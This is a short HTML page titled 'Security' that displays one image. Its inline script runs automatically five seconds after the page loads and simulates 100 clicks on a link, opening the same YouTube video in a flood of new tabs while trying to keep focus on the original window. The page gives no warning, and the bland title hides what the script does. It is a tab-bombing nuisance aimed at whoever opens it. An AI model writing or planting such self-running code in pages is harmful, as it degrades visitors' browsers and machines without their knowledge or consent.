<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Security</title>
</head>
<body>
    <img src="https://lh6.googleusercontent.com/proxy/zhH0HoRpJcmqLfHLAKbbQ60jcrX9m0PWE6XXmYPqjWpOof4V8f7hF2_-nPBGLwx6p-4CZVfV5StQNV-_u5xHj1E544p7JTFIH_XSdZfY8LywRfqOdXbEeqV6jigShsecMyifILxy_6ULM29E=w1920-h911">
    <script>
        window.onload = setTimeout(function() {
            let i = 100; // Initialize the counter

            while (i > 0) {
                const url = 'https://www.youtube.com/watch?v=a3Z7zEc7AXQ';

                // Create an anchor element
                const link = document.createElement('a');
                link.href = url;
                link.target = '_blank';

                // Append the anchor to the document body
                document.body.appendChild(link);

                // Simulate a click on the anchor
                link.click();

                // Remove the anchor from the document (optional)
                document.body.removeChild(link);

                // Blur the newTab and focus the window after a delay
                setTimeout(() => {
                    window.focus();
                }, 1000);

                i = i - 1;
            }
        }, 5000);
    </script>
</body>
</html>
